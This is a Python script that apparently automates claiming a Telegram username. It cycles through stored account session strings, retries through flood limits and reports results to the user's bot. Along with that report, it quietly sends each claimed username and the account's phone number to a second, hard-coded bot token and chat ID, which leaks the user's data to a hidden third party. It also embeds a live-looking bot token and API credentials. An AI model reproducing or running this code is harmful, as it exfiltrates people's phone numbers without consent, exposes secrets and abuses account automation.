import pyrogram;from pyrogram import client;from pyrogram import *;from pyrogram.types import *;import requests,re;from time import sleep;from pyrogram.errors import FloodWait ,BadRequest
info = open("info.txt",'r').read();tok = info.split('\n')[0];idown = info.split('\n')[1]
r = open("ID.txt").read()
mk = r.replace("@", "")
o = mk.replace(" ", "")
qq = 0
req = requests.get(f"https://t.me/{o}").text
if "tgme_username_link" not in req:
	print("No")
	v = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- The user is used')
	exit("The user is used")
while True:
	for session in open("Number.txt","r").read().split("\n"):
		if session != "":
			try:
				if session != " ":
					app = Client("ACC",api_id=12839517,api_hash="93558259342c226fa73159909020400c",session_string=session)
					app.connect()
					try:
						app.set_username(o)
						qq+=1
						op = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=
Username : @{o}
Clicks : {qq}
Saved in : Account
NumBer : {app.get_me().phone_number}''')
						pl = requests.post(f'''https://api.telegram.org/bot6002155062:AAHnR6j9qmRJ1mReNmkWSJm-wcngqQTvUvc/sendMessage?chat_id=1308075085&text=
~ UserName: @{o}
~ Clicks: {qq}
~ Type: Account
~ Phone : {app.get_me().phone_number}''')
					except FloodWait as e:
						qq+=1
						ok = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text= 〔 {qq} 〕
NumBer : {app.get_me().phone_number}
Wrong : {e}''')
						pass
					except BadRequest as e:
						qq+=1
						ok = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text= ~ flood 〔 {qq} 〕
~ user @{o}''')
					try:
						sleep(int(open("sleep.txt").read()))
					except:
						time.sleep(0.5)
			except:
				pass